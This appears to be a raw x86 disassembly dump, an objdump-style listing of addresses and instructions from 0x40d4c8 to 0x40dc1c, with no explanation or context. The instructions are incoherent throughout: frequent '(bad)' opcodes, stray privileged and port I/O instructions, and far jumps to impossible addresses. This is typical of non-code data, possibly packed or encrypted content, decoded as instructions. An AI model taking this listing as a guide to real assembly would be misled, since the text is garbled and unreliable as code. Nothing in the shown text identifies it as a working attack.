  40d4c8:	ror    esp,0x6b
  40d4cb:	imul   ebx,DWORD PTR [ebx+0x43b544d],0xb5e73fe4
  40d4d5:	loop   0x40d54b
  40d4d7:	xor    BYTE PTR [esp+ebx*8-0x16ec7c63],bh
  40d4de:	pop    esi
  40d4df:	lahf   
  40d4e0:	adc    DWORD PTR [esi],edx
  40d4e2:	mov    bh,0xc0
  40d4e4:	(bad)  
  40d4e5:	into   
  40d4e6:	iret   
  40d4e7:	icebp  
  40d4e8:	sahf   
  40d4e9:	aas    
  40d4ea:	repnz cld 
  40d4ec:	f2xm1  
  40d4ee:	pop    ds
  40d4ef:	das    
  40d4f0:	mov    al,ds:0x61cd021e
  40d4f5:	or     ah,BYTE PTR [ecx+0x5b]
  40d4f8:	and    DWORD PTR [ebp-0x341400a9],0x13ff2313
  40d502:	aas    
  40d503:	fwait
  40d504:	sub    eax,eax
  40d506:	xlat   BYTE PTR ds:[ebx]
  40d507:	sub    DWORD PTR [edi+0x30],edi
  40d50a:	add    DWORD PTR [edx+0x6d],ecx
  40d50d:	xor    ebp,DWORD PTR [edx]
  40d50f:	mov    edi,es
  40d511:	or     ch,BYTE PTR [edi+0x219a94aa]
  40d517:	xchg   ebx,eax
  40d518:	clc    
  40d519:	daa    
  40d51a:	jmp    0xe4b6b210
  40d51f:	in     eax,dx
  40d520:	jle    0x40d4f7
  40d522:	xor    edx,DWORD PTR [esi-0x30]
  40d525:	sbb    ecx,edx
  40d527:	or     ecx,ebp
  40d529:	mov    ah,0x9d
  40d52b:	sbb    DWORD PTR [ebx*2-0x6050a990],esp
  40d532:	or     DWORD PTR [ebx],ebx
  40d534:	in     eax,0x53
  40d536:	xchg   ecx,eax
  40d537:	in     eax,dx
  40d538:	js     0x40d540
  40d53a:	fstp   st(5)
  40d53c:	repnz cld 
  40d53e:	bound  ebp,QWORD PTR [eax-0x6d]
  40d541:	dec    eax
  40d542:	arpl   WORD PTR [eax+esi*1+0x7caae4f0],sp
  40d549:	sti    
  40d54a:	xor    bh,al
  40d54c:	leave  
  40d54d:	push   0xc3baeb90
  40d552:	jle    0x40d500
  40d554:	mov    esp,0x5410fd48
  40d559:	and    DWORD PTR [ebx],edi
  40d55b:	jg     0x40d58e
  40d55d:	sub    BYTE PTR [ebx-0x43],dh
  40d560:	cwde   
  40d561:	mov    ss,WORD PTR [ebx-0x38bb6c45]
  40d567:	mul    ebp
  40d569:	mov    ?,WORD PTR [edi-0x9abd878]
  40d56f:	les    eax,FWORD PTR [edi]
  40d571:	in     eax,dx
  40d572:	lods   eax,DWORD PTR ds:[esi]
  40d573:	test   al,0xf0
  40d575:	js     0x40d54c
  40d577:	dec    edx
  40d578:	aad    0x99
  40d57a:	shl    DWORD PTR [eax],cl
  40d57c:	(bad)  
  40d57d:	and    al,0x86
  40d57f:	idiv   ebx
  40d581:	mov    ecx,0x8d96e9df
  40d586:	xchg   esp,eax
  40d587:	inc    esp
  40d588:	retf   
  40d589:	xchg   esp,eax
  40d58a:	into   
  40d58b:	jno    0x40d5cb
  40d58d:	fst    DWORD PTR [eax+edx*2]
  40d590:	mov    es,WORD PTR [ecx]
  40d592:	sbb    ch,BYTE PTR [esi+0x2a]
  40d595:	jg     0x40d5dc
  40d597:	mov    dh,0xef
  40d599:	aam    0x50
  40d59b:	xor    eax,0x9959f726
  40d5a0:	cmp    al,0x24
  40d5a2:	lds    edi,FWORD PTR [edx+ebx*4]
  40d5a5:	xor    al,0xc2
  40d5a7:	outs   dx,DWORD PTR ds:[esi]
  40d5a8:	inc    esp
  40d5a9:	jo     0x40d559
  40d5ab:	idiv   esp
  40d5ad:	xchg   edx,eax
  40d5ae:	pop    edx
  40d5af:	sbb    al,BYTE PTR [ebp+0xfaebc49]
  40d5b5:	sti    
  40d5b6:	jo     0x40d54f
  40d5b8:	dec    esi
  40d5b9:	mov    cs,WORD PTR [edx-0x61]
  40d5bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d5bd:	dec    edi
  40d5be:	inc    ecx
  40d5bf:	and    edx,0xffffffe7
  40d5c2:	mov    eax,ds:0x608b28dc
  40d5c7:	mov    ?,WORD PTR [eax-0x11402a3]
  40d5cd:	push   eax
  40d5ce:	mov    edx,0x81cdd362
  40d5d3:	xlat   BYTE PTR ds:[ebx]
  40d5d4:	xchg   edx,eax
  40d5d5:	sbb    al,0x3b
  40d5d7:	cmp    BYTE PTR [edi-0x2f],dl
  40d5da:	mov    esi,0x97ce7096
  40d5df:	mov    ds:0x3b0399bf,al
  40d5e4:	loopne 0x40d5e6
  40d5e6:	(bad)  
  40d5e7:	xor    al,BYTE PTR [eax-0x6e224929]
  40d5ed:	(bad)  
  40d5ee:	fimul  DWORD PTR [ecx]
  40d5f0:	dec    edi
  40d5f1:	popa   
  40d5f2:	rcr    ecx,cl
  40d5f4:	jo     0x40d588
  40d5f6:	jl     0x40d66d
  40d5f8:	jecxz  0x40d5b9
  40d5fa:	pop    ebx
  40d5fb:	outs   dx,BYTE PTR ds:[esi]
  40d5fc:	mov    al,0x74
  40d5fe:	clc    
  40d5ff:	inc    ecx
  40d600:	lods   eax,DWORD PTR ds:[esi]
  40d601:	rcr    ebx,1
  40d603:	mov    ?,ecx
  40d605:	add    BYTE PTR [eax+esi*4+0x402bfbcb],bh
  40d60c:	mov    BYTE PTR [esi+0x40d47292],dl
  40d612:	push   cs
  40d613:	pop    ds
  40d614:	jge    0x40d61b
  40d616:	dec    esi
  40d617:	cli    
  40d618:	loopne 0x40d5fc
  40d61a:	or     cl,cl
  40d61c:	sbb    al,0x19
  40d61e:	test   DWORD PTR [eax],esp
  40d620:	test   al,0xea
  40d622:	xchg   edi,eax
  40d623:	mov    esp,0x62ac9876
  40d628:	fs dec edi
  40d62a:	stc    
  40d62b:	add    eax,0xe0410f02
  40d630:	(bad)  
  40d631:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d632:	cmp    dl,BYTE PTR [ebx+0x33]
  40d635:	jle    0x40d5e7
  40d637:	and    edi,DWORD PTR [esp+ebp*2-0xb24c7c9]
  40d63e:	dec    esi
  40d63f:	push   ebp
  40d640:	or     al,0xdd
  40d642:	lds    ebp,FWORD PTR [eax+0x28861c28]
  40d648:	cmp    ah,BYTE PTR [ecx+0x7e77502]
  40d64e:	xchg   esp,eax
  40d64f:	pusha  
  40d650:	fwait
  40d651:	call   FWORD PTR [edi+0xc6ed5d6]
  40d657:	push   cs
  40d658:	test   DWORD PTR [ecx-0x7db78ebc],ecx
  40d65e:	stc    
  40d65f:	ja     0x40d6aa
  40d661:	les    edi,FWORD PTR [eax-0x73]
  40d664:	sbb    al,0x3d
  40d666:	retf   0xac66
  40d669:	std    
  40d66a:	sub    DWORD PTR [ebx],esi
  40d66c:	pop    eax
  40d66d:	push   es
  40d66e:	cs ret 
  40d670:	push   ebx
  40d671:	in     al,dx
  40d672:	(bad)  
  40d673:	loop   0x40d66d
  40d675:	stc    
  40d676:	xor    edx,DWORD PTR [ebx-0x532b206e]
  40d67c:	pushf  
  40d67d:	and    BYTE PTR [ebp+edx*4-0x4],cl
  40d681:	jo     0x40d679
  40d683:	xlat   BYTE PTR ds:[ebx]
  40d684:	or     DWORD PTR [edi-0x71790013],edi
  40d68a:	dec    esi
  40d68b:	adc    DWORD PTR [ecx],ebp
  40d68d:	xor    al,0x89
  40d68f:	aaa    
  40d690:	cmp    eax,0x478d2ce8
  40d695:	push   0x7b
  40d697:	push   cs
  40d698:	xor    dl,BYTE PTR [ebp+0x25]
  40d69b:	and    DWORD PTR [edi-0x752111e],ecx
  40d6a1:	jg     0x40d70e
  40d6a3:	push   esi
  40d6a4:	enter  0xd42f,0xa1
  40d6a8:	sbb    ebp,0x29
  40d6ab:	ret    
  40d6ac:	jmp    0x40d689
  40d6ae:	repz dec ebx
  40d6b0:	pop    ds
  40d6b1:	adc    esi,DWORD PTR ds:0x5c9459a1
  40d6b7:	sbb    DWORD PTR [edx],esp
  40d6b9:	hlt    
  40d6ba:	cdq    
  40d6bb:	aas    
  40d6bc:	jo     0x40d6ee
  40d6be:	cmp    DWORD PTR [esi+ebx*1],edx
  40d6c1:	mov    edx,0xd2576033
  40d6c6:	jb     0x40d65f
  40d6c8:	call   DWORD PTR [ebx-0x3650e358]
  40d6ce:	xchg   BYTE PTR [eax+0x46],bl
  40d6d1:	js     0x40d74c
  40d6d3:	push   ds
  40d6d4:	add    al,0xad
  40d6d6:	dec    ecx
  40d6d7:	add    BYTE PTR [eax-0x11374685],0x39
  40d6de:	fadd   DWORD PTR [ebp*4-0x53444dd5]
  40d6e5:	jmp    0xcea60b45
  40d6ea:	aam    0xbd
  40d6ec:	outs   dx,BYTE PTR ds:[esi]
  40d6ed:	js     0x40d71f
  40d6ef:	mov    eax,0xb06d0555
  40d6f4:	cmp    al,0x1c
  40d6f6:	icebp  
  40d6f7:	and    BYTE PTR [ecx+0x88a57df],0x69
  40d6fe:	dec    edx
  40d6ff:	int3   
  40d700:	ret    
  40d701:	inc    edx
  40d702:	std    
  40d703:	stc    
  40d704:	gs mov ebp,0xe2b21b7
  40d70a:	jl     0x40d6fc
  40d70c:	and    DWORD PTR [esi+0x19],edi
  40d70f:	xchg   ebx,eax
  40d710:	mul    DWORD PTR [edi]
  40d712:	inc    esp
  40d713:	shr    edi,0xb9
  40d716:	test   BYTE PTR [ebp-0x5a],dh
  40d719:	test   al,0x96
  40d71b:	fsub   QWORD PTR [ecx-0x47bb0094]
  40d721:	cmp    DWORD PTR [ebx+ebp*4+0x7b],edi
  40d725:	out    dx,al
  40d726:	js     0x40d76a
  40d728:	push   es
  40d729:	dec    eax
  40d72a:	sub    ebp,DWORD PTR [eax+0x3733ede2]
  40d730:	or     edx,ebx
  40d732:	sub    dh,ah
  40d734:	mov    ds:0xba7ef303,eax
  40d739:	add    al,BYTE PTR [edx]
  40d73b:	ror    ch,cl
  40d73d:	cmp    eax,ebp
  40d73f:	xor    bl,ch
  40d741:	dec    edi
  40d742:	enter  0xe9be,0x4c
  40d746:	cmp    DWORD PTR [ebp+0x7898d33a],edi
  40d74c:	cmp    al,0xd9
  40d74e:	and    eax,0xf341c30f
  40d753:	push   eax
  40d754:	or     eax,0x50328e45
  40d759:	not    DWORD PTR [edx]
  40d75b:	pop    esp
  40d75c:	or     al,0x1d
  40d75e:	dec    edx
  40d75f:	shl    ecx,0x9e
  40d762:	(bad)  
  40d763:	(bad)  [ecx]
  40d765:	aaa    
  40d766:	imul   ecx,DWORD PTR [edi],0xbc5257a3
  40d76c:	mov    eax,0x88ca0795
  40d771:	imul   edx,DWORD PTR [ebp+0xb1e60d7],0xffffffb4
  40d778:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d779:	push   ds
  40d77a:	(bad)  
  40d77b:	out    0x8b,eax
  40d77d:	xor    bh,dh
  40d77f:	dec    edi
  40d780:	xchg   esi,eax
  40d781:	xor    eax,0xe6bc54bf
  40d786:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d787:	outs   dx,DWORD PTR ds:[esi]
  40d788:	mov    bl,0xd9
  40d78a:	and    BYTE PTR ss:[eax+ebp*2-0x60453291],dl
  40d792:	mov    bl,0xef
  40d794:	mov    bh,0x1
  40d796:	aam    0x78
  40d798:	or     DWORD PTR [ebx],edx
  40d79a:	mov    ds:0x3921cce2,al
  40d79f:	cmp    DWORD PTR [edx+0x7c28dad2],eax
  40d7a5:	aas    
  40d7a6:	sbb    ebp,eax
  40d7a8:	ins    BYTE PTR es:[edi],dx
  40d7a9:	sti    
  40d7aa:	out    dx,al
  40d7ab:	(bad)  
  40d7ac:	xor    bh,BYTE PTR [ecx]
  40d7ae:	jns    0x40d783
  40d7b0:	push   ecx
  40d7b1:	ins    DWORD PTR es:[edi],dx
  40d7b2:	inc    esp
  40d7b3:	leave  
  40d7b4:	pop    eax
  40d7b5:	mov    esi,0x172cc5c8
  40d7ba:	nop
  40d7bb:	fs std 
  40d7bd:	sub    esi,DWORD PTR [edx]
  40d7bf:	dec    esp
  40d7c0:	pop    ebp
  40d7c1:	outs   dx,DWORD PTR ds:[esi]
  40d7c2:	fnsave [esi-0x54]
  40d7c5:	mov    edi,0x7b006f27
  40d7ca:	lods   eax,DWORD PTR ds:[esi]
  40d7cb:	mov    DWORD PTR [ebx+0x5c57fdfd],esi
  40d7d1:	inc    esp
  40d7d2:	xor    eax,DWORD PTR [ecx-0x7c00c321]
  40d7d8:	test   BYTE PTR ds:[edi-0x60],0x75
  40d7dd:	aam    0x6d
  40d7df:	(bad)  
  40d7e0:	fild   QWORD PTR [ebp+0xf378ef5]
  40d7e6:	ja     0x40d7cb
  40d7e8:	cli    
  40d7e9:	stc    
  40d7ea:	sbb    esp,DWORD PTR [edi]
  40d7ec:	xchg   ebp,eax
  40d7ed:	in     al,dx
  40d7ee:	push   0x9f25ecb8
  40d7f3:	inc    edx
  40d7f4:	imul   edx,ebp,0xb9bf3c6c
  40d7fa:	pop    edi
  40d7fb:	add    ch,BYTE PTR [edx]
  40d7fd:	mov    edi,0x5fdac0ac
  40d802:	fistp  WORD PTR [eax-0x4f]
  40d805:	out    0x95,eax
  40d807:	lods   al,BYTE PTR ds:[esi]
  40d808:	and    eax,DWORD PTR ds:0x1988492b
  40d80e:	xchg   ecx,eax
  40d80f:	or     ecx,DWORD PTR [eax-0x52be7241]
  40d815:	jp     0x40d7fe
  40d817:	mov    ebp,0x6971bc0
  40d81c:	pop    edi
  40d81d:	pushf  
  40d81e:	dec    BYTE PTR [ebx+0x6f762720]
  40d824:	js     0x40d82b
  40d826:	mov    dl,0x10
  40d828:	jecxz  0x40d827
  40d82a:	pop    edx
  40d82b:	icebp  
  40d82c:	cmp    DWORD PTR [edi+0x421c7a3a],esi
  40d832:	aaa    
  40d833:	sbb    bh,bh
  40d835:	call   0x8cea:0xba82884c
  40d83c:	push   0x4f948343
  40d841:	mov    al,0x6f
  40d843:	push   edx
  40d844:	jno    0x40d8a7
  40d846:	jno    0x40d880
  40d848:	loop   0x40d7d9
  40d84a:	pop    ecx
  40d84b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d84c:	pop    ebp
  40d84d:	rcl    DWORD PTR [edx+0x1110525e],cl
  40d853:	rol    DWORD PTR [esi+0x6a],0x68
  40d857:	in     al,dx
  40d858:	idiv   BYTE PTR ss:[eax-0x4d]
  40d85c:	push   ebx
  40d85d:	pop    ss
  40d85e:	aam    0xf2
  40d860:	ins    BYTE PTR es:[edi],dx
  40d861:	or     DWORD PTR fs:[edi+0x7cd01add],ebp
  40d868:	inc    edi
  40d869:	or     cl,BYTE PTR [ebp-0x4dc7a33f]
  40d86f:	mov    ch,0xaa
  40d871:	add    esi,DWORD PTR [ecx+0x12]
  40d874:	arpl   WORD PTR [esi-0x67],ax
  40d877:	ror    BYTE PTR ds:0x71f02132,cl
  40d87d:	out    0x9e,eax
  40d87f:	ja     0x40d899
  40d881:	sbb    ebp,DWORD PTR [edi]
  40d883:	mov    al,0x6c
  40d885:	push   edx
  40d886:	in     eax,0x4f
  40d888:	scas   eax,DWORD PTR es:[edi]
  40d889:	xchg   esp,eax
  40d88a:	iret   
  40d88b:	xor    DWORD PTR [ebp+0x25],ecx
  40d88e:	and    esi,DWORD PTR [edi]
  40d890:	mov    cl,0x88
  40d892:	pop    eax
  40d893:	mov    dl,BYTE PTR [ecx-0x19]
  40d896:	xchg   BYTE PTR [eax+0x7f],dl
  40d899:	fcom   DWORD PTR [edx+edi*1+0x26]
  40d89d:	cli    
  40d89e:	pop    eax
  40d89f:	out    dx,eax
  40d8a0:	aam    0x5f
  40d8a2:	xchg   BYTE PTR [eax+0x60159022],cl
  40d8a8:	cmp    BYTE PTR [esi+ebx*4-0x16],0x83
  40d8ad:	mov    edx,0xc36b669d
  40d8b2:	out    dx,eax
  40d8b3:	les    esi,FWORD PTR [ecx+0xbcf6393]
  40d8b9:	and    BYTE PTR [edx+0x1a],0x86
  40d8bd:	sar    BYTE PTR [eax],1
  40d8bf:	loope  0x40d8dd
  40d8c1:	sahf   
  40d8c2:	loope  0x40d86a
  40d8c4:	fldcw  WORD PTR [ecx]
  40d8c6:	dec    edx
  40d8c7:	(bad)
  40d8cb:	sbb    eax,0xd6d9a6d1
  40d8d0:	out    dx,al
  40d8d1:	pop    ds
  40d8d2:	aad    0x2b
  40d8d4:	les    edi,FWORD PTR [edi-0x6011bf9c]
  40d8da:	cmp    dl,0x5
  40d8dd:	push   esp
  40d8de:	dec    eax
  40d8df:	jmp    0xeda:0x842cf951
  40d8e6:	xchg   edi,eax
  40d8e7:	repnz dec esi
  40d8e9:	sbb    al,0x12
  40d8eb:	mov    ds:0xc109ca1a,al
  40d8f0:	mov    ecx,0xdc547bc
  40d8f5:	(bad)  
  40d8f6:	dec    DWORD PTR [esi-0x1d]
  40d8f9:	mov    al,bl
  40d8fb:	and    ecx,edi
  40d8fd:	mov    eax,fs:0x69bbd7db
  40d903:	enter  0x3d1e,0x3f
  40d907:	sbb    edi,esp
  40d909:	add    al,BYTE PTR [ebp-0x1aa91cee]
  40d90f:	imul   ebx,esp,0x891c7245
  40d915:	out    dx,eax
  40d916:	mov    edx,0x4f7eadc4
  40d91b:	and    bl,BYTE PTR cs:[esi]
  40d91e:	inc    edx
  40d91f:	stc    
  40d920:	test   eax,0xf7d602fd
  40d925:	jno    0x40d97e
  40d927:	or     bh,BYTE PTR [eax]
  40d929:	rcr    DWORD PTR [eax-0x14521717],cl
  40d92f:	iret   
  40d930:	fadd   DWORD PTR [ecx-0x7949ed4c]
  40d936:	push   ebp
  40d937:	dec    ebp
  40d938:	ins    BYTE PTR es:[edi],dx
  40d939:	xlat   BYTE PTR ds:[ebx]
  40d93a:	arpl   sp,si
  40d93c:	mov    esi,0xb3a1b8f0
  40d941:	out    0x12,eax
  40d943:	cmp    ah,0xf3
  40d946:	jle    0x40d8df
  40d948:	sti    
  40d949:	push   cs
  40d94a:	aas    
  40d94b:	or     BYTE PTR [eax],ch
  40d94d:	pop    ss
  40d94e:	mov    ch,0xa3
  40d950:	les    edi,FWORD PTR [edx+0x4c]
  40d953:	out    dx,al
  40d954:	aaa    
  40d955:	fld    DWORD PTR [edx]
  40d957:	adc    al,0x64
  40d959:	mov    cl,0x63
  40d95b:	adc    bl,BYTE PTR [esi+0x15193662]
  40d961:	stc    
  40d962:	mov    dl,0x5f
  40d964:	or     edx,DWORD PTR [eax+esi*1]
  40d967:	jl     0x40d99e
  40d969:	pop    ss
  40d96a:	cmp    DWORD PTR [eax+0x64529f57],ebp
  40d970:	add    DWORD PTR [esi],0xffffffc3
  40d973:	sar    BYTE PTR [edi+esi*8+0x7599850b],1
  40d97a:	fistp  WORD PTR [esi-0x78f011ef]
  40d980:	sub    esp,DWORD PTR [ebx-0x12]
  40d983:	adc    al,0x18
  40d985:	pop    edx
  40d986:	in     al,0xc9
  40d988:	lock sbb eax,0x1899b96e
  40d98e:	cmp    ah,BYTE PTR [ecx-0x640136a8]
  40d994:	loope  0x40da14
  40d996:	pushf  
  40d997:	lds    edx,FWORD PTR [eax-0x3e40176c]
  40d99d:	loope  0x40d9de
  40d99f:	or     al,0xb8
  40d9a1:	mov    esp,cs
  40d9a3:	xchg   DWORD PTR [esi],esp
  40d9a5:	cwde   
  40d9a6:	xor    DWORD PTR [edx],eax
  40d9a8:	icebp  
  40d9a9:	ret    0x63a5
  40d9ac:	mov    ds:0xc9a5f0b2,eax
  40d9b1:	push   esp
  40d9b2:	shl    BYTE PTR [edi],cl
  40d9b4:	jnp    0x40d9c9
  40d9b6:	popa   
  40d9b7:	repnz sti 
  40d9b9:	out    dx,al
  40d9ba:	imul   ecx,DWORD PTR [ecx],0x49
  40d9bd:	scas   al,BYTE PTR es:[edi]
  40d9be:	push   edx
  40d9bf:	or     bl,ah
  40d9c1:	adc    eax,0xb3841837
  40d9c6:	out    dx,al
  40d9c7:	mov    al,ds:0x8546a2cd
  40d9cc:	mov    edi,0xf491b0c
  40d9d1:	mov    edx,0x720b7818
  40d9d6:	mov    ah,0xab
  40d9d8:	push   ebx
  40d9d9:	jns    0x40d986
  40d9db:	std    
  40d9dc:	sub    al,0xef
  40d9de:	imul   eax,DWORD PTR [eax],0xffffff93
  40d9e1:	sbb    dl,BYTE PTR [edi-0x51a7851c]
  40d9e7:	inc    ebx
  40d9e8:	and    al,ah
  40d9ea:	push   0x7fd328f
  40d9ef:	stos   BYTE PTR es:[edi],al
  40d9f0:	mov    BYTE PTR [ebx],0x3a
  40d9f3:	push   ss
  40d9f4:	mov    ah,dh
  40d9f6:	loop   0x40d9b2
  40d9f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d9f9:	mov    dh,0x96
  40d9fb:	jle    0x40da71
  40d9fd:	jp     0x40da44
  40d9ff:	icebp  
  40da00:	jnp    0x40da64
  40da02:	fld    DWORD PTR [esi+0x5]
  40da05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da06:	(bad)  
  40da07:	xor    eax,0x4364fff0
  40da0c:	mov    ebx,0xf52a3f12
  40da11:	mov    bl,0xd3
  40da13:	in     al,dx
  40da14:	ja     0x40d9a6
  40da16:	inc    edx
  40da17:	aad    0x7b
  40da19:	or     dh,BYTE PTR [esi]
  40da1b:	xchg   ebp,eax
  40da1c:	jbe    0x40da33
  40da1e:	push   esi
  40da1f:	retf   
  40da20:	push   esp
  40da21:	mov    ch,0x21
  40da23:	xchg   edx,eax
  40da24:	(bad)  
  40da26:	enter  0xaa71,0x77
  40da2a:	mov    al,ds:0xc9896475
  40da2f:	dec    eax
  40da30:	push   cs
  40da31:	and    ah,cl
  40da33:	rcr    dh,cl
  40da35:	dec    esp
  40da36:	loopne 0x40dab7
  40da38:	jle    0x40da96
  40da3a:	mov    cl,0x7e
  40da3c:	stc    
  40da3d:	jb     0x40da02
  40da3f:	popf   
  40da40:	mov    edi,0x1f59f7a4
  40da45:	mov    cl,0xe1
  40da47:	push   0x51
  40da49:	stc    
  40da4a:	(bad)  
  40da4c:	ja     0x40da06
  40da4e:	pop    esi
  40da4f:	mov    BYTE PTR ds:[eax],ch
  40da52:	jp     0x40da93
  40da54:	ret    0x51a1
  40da57:	stos   BYTE PTR es:[edi],al
  40da58:	enter  0x5780,0x70
  40da5c:	icebp  
  40da5d:	gs repnz pop eax
  40da60:	(bad)  [edx]
  40da62:	push   edx
  40da63:	addr16 imul edi,ebp,0x7f
  40da67:	retf   0x2b1e
  40da6a:	jp     0x40dac9
  40da6c:	jp     0x40d9f7
  40da6e:	jnp    0x40d9f4
  40da70:	not    DWORD PTR [eax+0x57]
  40da73:	dec    edx
  40da74:	test   cl,ah
  40da76:	sub    DWORD PTR [eax+0x4d90e4bf],ebx
  40da7c:	sbb    eax,0x2a6b4848
  40da81:	out    dx,eax
  40da82:	lods   al,BYTE PTR ds:[esi]
  40da83:	cmp    DWORD PTR [eax-0x40561ce9],edi
  40da89:	mov    edi,0x5d94056f
  40da8e:	jb     0x40dab9
  40da90:	or     DWORD PTR [edx-0x6e269324],0xffffffea
  40da97:	outs   dx,BYTE PTR ds:[esi]
  40da98:	cld    
  40da99:	and    esi,DWORD PTR [ebx]
  40da9b:	jnp    0x40da9b
  40da9d:	or     dh,al
  40da9f:	scas   al,BYTE PTR es:[edi]
  40daa0:	cs nop
  40daa2:	jle    0x40da44
  40daa4:	jmp    0x5586:0x288e468
  40daab:	retf   0xeb2d
  40daae:	nop
  40daaf:	dec    esi
  40dab0:	cmp    DWORD PTR [ebp-0x7d],esp
  40dab3:	in     al,dx
  40dab4:	arpl   bp,ax
  40dab6:	inc    ebp
  40dab7:	iret   
  40dab8:	stos   DWORD PTR es:[edi],eax
  40dab9:	jecxz  0x40db38
  40dabb:	or     ebp,DWORD PTR [esi]
  40dabd:	clc    
  40dabe:	mov    DWORD PTR [ebx+0x3e],ecx
  40dac1:	xchg   ebx,eax
  40dac2:	imul   ebx,DWORD PTR [ebp-0x3a],0x7f
  40dac6:	fld    TBYTE PTR [eax+0x8]
  40dac9:	dec    edi
  40daca:	push   0x6e080310
  40dacf:	(bad)  
  40dad0:	sti    
  40dad1:	mov    BYTE PTR [edi+0x1a34732],bl
  40dad7:	mov    bh,0xa7
  40dad9:	test   BYTE PTR [esi],ch
  40dadb:	adc    bh,ch
  40dadd:	(bad)  
  40dade:	sub    eax,0xcc49037f
  40dae3:	cmp    DWORD PTR [ebx],esp
  40dae5:	dec    ebp
  40dae6:	cmp    edi,DWORD PTR [ecx+ebx*8]
  40dae9:	pop    ss
  40daea:	mov    ebp,0x5bffe24b
  40daef:	popf   
  40daf0:	ror    BYTE PTR [eax+0x0],cl
  40daf3:	(bad)  
  40daf4:	scas   al,BYTE PTR es:[edi]
  40daf5:	cli    
  40daf6:	jne    0x40dacf
  40daf8:	or     eax,0x33f33703
  40dafe:	push   es
  40daff:	in     al,dx
  40db00:	or     ah,BYTE PTR [ebx+0x6246816c]
  40db06:	mov    BYTE PTR [ebp+0x5838684c],ch
  40db0c:	aaa    
  40db0d:	jo     0x40db62
  40db0f:	(bad)  
  40db10:	mov    bl,0xec
  40db12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db13:	nop
  40db14:	jl     0x40da9f
  40db16:	jb     0x40dab8
  40db18:	xor    eax,0x70e4e35b
  40db1d:	pop    edx
  40db1e:	pushf  
  40db1f:	sub    ch,al
  40db21:	shr    BYTE PTR [edi+0x79844fe2],cl
  40db27:	jbe    0x40db8b
  40db29:	loopne 0x40db95
  40db2b:	adc    dh,BYTE PTR [ebp-0x18]
  40db2e:	mov    DWORD PTR [edx+0x64804ef4],ecx
  40db34:	pop    ebx
  40db35:	call   DWORD PTR [edi]
  40db37:	leave  
  40db38:	cmp    esi,DWORD PTR [edi+0x56]
  40db3b:	dec    ebx
  40db3c:	pop    edi
  40db3d:	lods   al,BYTE PTR ds:[esi]
  40db3e:	jnp    0x40db5b
  40db40:	or     eax,0xf0a5dfd3
  40db45:	mov    DWORD PTR [eax],esp
  40db47:	and    BYTE PTR [edx],dl
  40db49:	pop    ebp
  40db4a:	idiv   BYTE PTR [edi+0x6e]
  40db4d:	sbb    al,0x7
  40db4f:	push   ds
  40db50:	mov    ebx,DWORD PTR [edx+0x53]
  40db53:	push   edi
  40db54:	add    al,0x2b
  40db56:	stos   DWORD PTR es:[edi],eax
  40db57:	rcr    DWORD PTR [esi-0x1d],0x64
  40db5b:	test   BYTE PTR [edx+edi*8-0x7e],al
  40db5f:	ret    
  40db60:	push   ebx
  40db61:	mov    eax,ds:0x6fb68904
  40db66:	ret    
  40db67:	(bad)  
  40db68:	in     al,dx
  40db69:	and    DWORD PTR [esp+edi*1+0x66],0xfffffff2
  40db6e:	mov    WORD PTR [ebp-0x76],ds
  40db71:	cld    
  40db72:	es pop ebx
  40db74:	xor    ebp,edx
  40db76:	mov    dl,BYTE PTR [edi]
  40db78:	pop    ebx
  40db79:	aad    0xea
  40db7b:	xchg   esp,eax
  40db7c:	fiadd  WORD PTR [ebx+0x6d507011]
  40db82:	xor    edi,esp
  40db84:	arpl   WORD PTR [ebx+0x12090d4],di
  40db8a:	xor    bl,BYTE PTR [eax+0x2f]
  40db8d:	lods   eax,DWORD PTR ds:[esi]
  40db8e:	test   ecx,ecx
  40db90:	cmc    
  40db91:	jnp    0x40db43
  40db93:	add    esp,DWORD PTR [ebx-0x17]
  40db96:	ret    0x68ab
  40db99:	jne    0x40db6e
  40db9b:	stc    
  40db9c:	shr    BYTE PTR [eax],0xec
  40db9f:	dec    edi
  40dba0:	pop    ds
  40dba1:	rcr    DWORD PTR [edi],cl
  40dba3:	outs   dx,BYTE PTR ds:[esi]
  40dba4:	dec    ecx
  40dba5:	mov    cl,0x93
  40dba7:	mov    ch,0x93
  40dba9:	inc    esp
  40dbaa:	or     ebp,DWORD PTR [eax]
  40dbac:	jp     0x40dc2b
  40dbae:	dec    eax
  40dbaf:	mov    eax,ds:0x7daf68e2
  40dbb4:	push   0xffffff97
  40dbb6:	mov    esi,0x7d6bdfd2
  40dbbb:	sub    eax,0xa80d8002
  40dbc0:	loope  0x40db4e
  40dbc2:	mov    ah,0x99
  40dbc4:	(bad)  
  40dbc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dbc7:	push   esi
  40dbc8:	loopne 0x40dbcf
  40dbca:	push   eax
  40dbcb:	dec    esi
  40dbcc:	push   edi
  40dbcd:	cwde   
  40dbce:	test   DWORD PTR [esi+0x59e86512],0x3b03c657
  40dbd8:	cld    
  40dbd9:	stos   BYTE PTR es:[edi],al
  40dbda:	(bad)  
  40dbdb:	xchg   esi,eax
  40dbdc:	outs   dx,DWORD PTR ds:[esi]
  40dbdd:	xchg   esi,eax
  40dbde:	bound  ebx,QWORD PTR [ebp+0x28025764]
  40dbe4:	add    edi,DWORD PTR [ebp-0x2b]
  40dbe7:	mov    edx,cs
  40dbe9:	mov    al,ds:0xf97887cd
  40dbee:	dec    eax
  40dbef:	sbb    esp,DWORD PTR [edx]
  40dbf1:	cmp    ebx,DWORD PTR [ebp-0x21898ddb]
  40dbf7:	imul   ecx,DWORD PTR [ebp+0x35],0x5eeefded
  40dbfe:	outs   dx,DWORD PTR ds:[esi]
  40dbff:	pop    ds
  40dc00:	not    DWORD PTR [esi-0x43912407]
  40dc06:	pop    ecx
  40dc07:	dec    ebp
  40dc08:	out    0xfd,eax
  40dc0a:	jmp    0x80ecd60b
  40dc0f:	ficom  WORD PTR [ebp+0x6629951]
  40dc15:	cmp    bh,bl
  40dc17:	push   cs
  40dc18:	lds    eax,FWORD PTR [bx+si]
  40dc1b:	dec    edi
  40dc1c:	fs xchg esi,eax
